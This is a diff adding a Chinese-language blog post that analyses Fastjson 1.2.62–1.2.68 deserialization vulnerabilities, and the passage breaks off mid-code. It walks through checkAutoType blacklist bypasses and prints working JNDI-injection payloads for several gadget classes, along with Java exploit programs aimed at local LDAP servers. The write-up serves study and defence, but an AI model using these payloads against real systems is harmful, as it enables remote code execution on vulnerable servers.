@@ -1,0 +1,919 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.jpg">
+  <link rel="icon" href="/img/fluid.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="huangdi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Fastjson1.2.62-1.2.68版本反序列化漏洞以及利用链子分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java安全-Fastjson1.2.62-1.2.68版本反序列化漏洞">
+<meta property="og:url" content="http://huang-d1.github.io/2025/10/10/Java%E5%AE%89%E5%85%A8-Fastjson1.2.62-1.2.68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="huangdi&#39;s blog">
+<meta property="og:description" content="Fastjson1.2.62-1.2.68版本反序列化漏洞以及利用链子分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f49.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f50.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f51.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f52.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f53.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f54.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f55.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f56.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f57.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f58.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f59.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f60.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f61.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f62.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f63.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f64.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f66.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f65.png">
+<meta property="og:image" content="http://huang-d1.github.io/img/fastjson/f67.png">
+<meta property="og:image" content="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1268PackFix.png">
+<meta property="og:image" content="https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/safeModeDefense.png">
+<meta property="article:published_time" content="2025-10-10T13:00:05.094Z">
+<meta property="article:modified_time" content="2025-10-10T13:01:27.445Z">
+<meta property="article:author" content="huangdi">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="Fastjson">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://huang-d1.github.io/img/fastjson/f49.png">
+  
+  
+  
+  <title>Java安全-Fastjson1.2.62-1.2.68版本反序列化漏洞 - huangdi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"huang-d1.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>huang-d1&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java安全-Fastjson1.2.62-1.2.68版本反序列化漏洞"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-10 21:00" pubdate>
+          2025年10月10日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          41 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java安全-Fastjson1.2.62-1.2.68版本反序列化漏洞</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="Java安全-Fastjson1-2-62-1-2-68版本反序列化漏洞"><a href="#Java安全-Fastjson1-2-62-1-2-68版本反序列化漏洞" class="headerlink" title="Java安全-Fastjson1.2.62-1.2.68版本反序列化漏洞"></a>Java安全-Fastjson1.2.62-1.2.68版本反序列化漏洞</h1><p>主要思路的话还是基于黑名单的绕过，然后构造出可行的 EXP 来攻击</p>
+<h1 id="1-2-62-反序列化漏洞"><a href="#1-2-62-反序列化漏洞" class="headerlink" title="1.2.62 反序列化漏洞"></a>1.2.62 反序列化漏洞</h1><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ul>
+<li>需要开启AutoType；</li>
+<li>Fastjson &lt;&#x3D; 1.2.62；</li>
+<li>JNDI注入利用所受的JDK版本限制；</li>
+<li>目标服务端需要存在xbean-reflect包；xbean-reflect 包的版本不限</li>
+</ul>
+<p><strong>pom.xml</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.62<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.xbean<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>xbean-reflect<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.18<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>  <br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br> <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="漏洞原理与-EXP"><a href="#漏洞原理与-EXP" class="headerlink" title="漏洞原理与 EXP"></a>漏洞原理与 EXP</h2><p>org.apache.xbean.propertyeditor.JndiConverter 类的 <code>toObjectImpl()</code> 函数存在 JNDI 注入漏洞</p>
+<p><img src="/img/fastjson/f49.png" srcset="/img/loading.gif" lazyload></p>
+<p>但是这个 <code>toObjectImpl()</code> 方法并不是 getter&#x2F;setter 方法，也不是构造函数，是不能直接调用的</p>
+<p>在对 <code>JndiConverter</code> 这个类进行反序列化的时候，会自动调用它的构造函数，而它的构造函数里面调用了它的父类。所以反序列化的时候不仅能够调用 <code>JndiConverter</code> 这个类，还会去调用它的父类 <code>AbstractConverter</code></p>
+<p><img src="/img/fastjson/f50.png" srcset="/img/loading.gif" lazyload></p>
+<p>在父类 <code>AbstractConverter</code> 中，找谁调用了 <code>JndiConverter#toObjectImpl()</code>，找到了 <code>AbstractConverter#setAsText()</code>；</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">setAsText()-&gt;toObject-&gt;toObjectImpl<br></code></pre></td></tr></table></figure>
+
+<p><img src="/img/fastjson/f51.png" srcset="/img/loading.gif" lazyload></p>
+<p>设置一下payload</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:8085/LsZvlYSt\&quot;&#125;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sf.maven.fastjsondemo;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SuccessBypassEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] argv)</span>&#123;<br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span>  <span class="hljs-operator">=</span><span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;ldap://127.0.0.1:8085/LsZvlYSt\&quot;&#125;&quot;</span>;<br>        JSON.parse(payload);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>顺利弹出计算器</p>
+<p><img src="/img/fastjson/f52.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><ul>
+<li>只分析开启AutoType</li>
+</ul>
+<p>直接在 <code>CheckAutoType()</code> 函数上打上断点开始分析，函数位置：<code>com\alibaba\fastjson\parser\ParserConfig.java</code></p>
+<p>相比于之前版本调试分析时看的 <code>CheckAutoType()</code> 函数，这里新增了一些代码逻辑，这里大致说下，下面代码是判断是否调用 AutoType 相关逻辑之前的代码，说明如注释：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (typeName == <span class="hljs-literal">null</span>) &#123;<br>          <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>      &#125;<br> <br><span class="hljs-comment">// 限制了JSON中@type指定的类名长度</span><br>      <span class="hljs-keyword">if</span> (typeName.length() &gt;= <span class="hljs-number">192</span> || typeName.length() &lt; <span class="hljs-number">3</span>) &#123;<br>          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>      &#125;<br> <br><span class="hljs-comment">// 单独对expectClass参数进行判断，设置expectClassFlag的值</span><br><span class="hljs-comment">// 当且仅当expectClass参数不为空且不为Object、Serializable、...等类类型时expectClassFlag才为true</span><br>      <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> expectClassFlag;<br>      <span class="hljs-keyword">if</span> (expectClass == <span class="hljs-literal">null</span>) &#123;<br>          expectClassFlag = <span class="hljs-literal">false</span>;<br>      &#125; <span class="hljs-keyword">else</span> &#123;<br>          <span class="hljs-keyword">if</span> (expectClass == Object.class<br>                  || expectClass == Serializable.class<br>                  || expectClass == Cloneable.class<br>                  || expectClass == Closeable.class<br>                  || expectClass == EventListener.class<br>                  || expectClass == Iterable.class<br>                  || expectClass == Collection.class<br>                  ) &#123;<br>              expectClassFlag = <span class="hljs-literal">false</span>;<br>          &#125; <span class="hljs-keyword">else</span> &#123;<br>              expectClassFlag = <span class="hljs-literal">true</span>;<br>          &#125;<br>      &#125;<br> <br>      <span class="hljs-type">String</span> <span class="hljs-variable">className</span> <span class="hljs-operator">=</span> typeName.replace(<span class="hljs-string">&#x27;$&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<br>      Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br> <br>      <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">BASIC</span> <span class="hljs-operator">=</span> <span class="hljs-number">0xcbf29ce484222325L</span>;<br>      <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">PRIME</span> <span class="hljs-operator">=</span> <span class="hljs-number">0x100000001b3L</span>;<br> <br><span class="hljs-comment">// 1.2.43检测，&quot;[&quot;</span><br>      <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">h1</span> <span class="hljs-operator">=</span> (BASIC ^ className.charAt(<span class="hljs-number">0</span>)) * PRIME;<br>      <span class="hljs-keyword">if</span> (h1 == <span class="hljs-number">0xaf64164c86024f1aL</span>) &#123; <span class="hljs-comment">// [</span><br>          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>      &#125;<br> <br><span class="hljs-comment">// 1.2.41检测，&quot;Lxx;&quot;</span><br>      <span class="hljs-keyword">if</span> ((h1 ^ className.charAt(className.length() - <span class="hljs-number">1</span>)) * PRIME == <span class="hljs-number">0x9198507b5af98f0L</span>) &#123;<br>          <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONException</span>(<span class="hljs-string">&quot;autoType is not support. &quot;</span> + typeName);<br>      &#125;<br> <br><span class="hljs-comment">// 1.2.42检测，&quot;LL&quot;</span><br>      <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">h3</span> <span class="hljs-operator">=</span> (((((BASIC ^ className.charAt(<span class="hljs-number">0</span>))<br>              * PRIME)<br>              ^ className.charAt(<span class="hljs-number">1</span>))<br>              * PRIME)<br>              ^ className.charAt(<span class="hljs-number">2</span>))<br>              * PRIME;<br> <br><span class="hljs-comment">// 对类名进行Hash计算并查找该值是否在INTERNAL_WHITELIST_HASHCODES即内部白名单中，若在则internalWhite为true</span><br>      <span class="hljs-type">boolean</span> <span class="hljs-variable">internalWhite</span> <span class="hljs-operator">=</span> Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,<br>              TypeUtils.fnv1a_64(className)<br>      ) &gt;= <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure>
+
+<p>在checkAutoType下一个断点，看到跟之前一样会先进行哈希白名单匹配、然后进行哈希黑名单过滤，</p>
+<p>能够成功绕过，之后会进入loadClass加载恶意类</p>
+<p>黑名单绕过的Gadget补丁都是在新版本中添加新Gadget黑名单来进行防御的：<a target="_blank" rel="noopener" href="https://github.com/alibaba/fastjson/compare/1.2.62%E2%80%A61.2.66#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4">https://github.com/alibaba/fastjson/compare/1.2.62%E2%80%A61.2.66#diff-f140f6d9ec704eccb9f4068af9d536981a644f7d2a6e06a1c50ab5ee078ef6b4</a></p>
+<p>新版本运行后直接被抛出异常：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">Exception in thread <span class="hljs-string">&quot;main&quot;</span> com.alibaba.fastjson.JSONException: autoType is not support. org.apache.xbe<br></code></pre></td></tr></table></figure>
+
+<p>在哈希黑名单中添加了该类，其中匹配到了该恶意类的Hash值：</p>
+<h1 id="1-2-66-反序列化漏洞"><a href="#1-2-66-反序列化漏洞" class="headerlink" title="1.2.66 反序列化漏洞"></a>1.2.66 反序列化漏洞</h1><h2 id="前提条件-1"><a href="#前提条件-1" class="headerlink" title="前提条件"></a>前提条件</h2><ul>
+<li>开启AutoType；</li>
+<li>Fastjson &lt;&#x3D; 1.2.66；</li>
+<li>JNDI注入利用所受的JDK版本限制；</li>
+<li>org.apache.shiro.jndi.JndiRealmFactory类需要shiro-core包；</li>
+<li>br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；</li>
+<li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li>
+</ul>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>新Gadget绕过黑名单限制。</p>
+<p>1.2.66涉及多条Gadget链，原理都是存在JDNI注入漏洞。</p>
+<p>org.apache.shiro.realm.jndi.JndiRealmFactory类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.shiro.realm.jndi.JndiRealmFactory&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;jndiNames&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;ldap://127.0.0.1:8085/LsZvlYSt&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">&quot;Realms&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>br.com.anteros.dbcp.AnterosDBCPConfig类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;metricRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span>或<span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;br.com.anteros.dbcp.AnterosDBCPConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;healthCheckRegistry&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类PoC：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;properties&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.util.Properties&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;UserTra</span><br></code></pre></td></tr></table></figure>
+
+<p>EXP</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;  <br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_1266</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;  <br>        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">String</span> <span class="hljs-variable">poc</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;ldap://localhost:1234/ExportObject\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;  <br><span class="hljs-comment">//        String poc = &quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;ldap://localhost:1389/Exploit\&quot;&#125;&quot;;  </span><br><span class="hljs-comment">//        String poc = 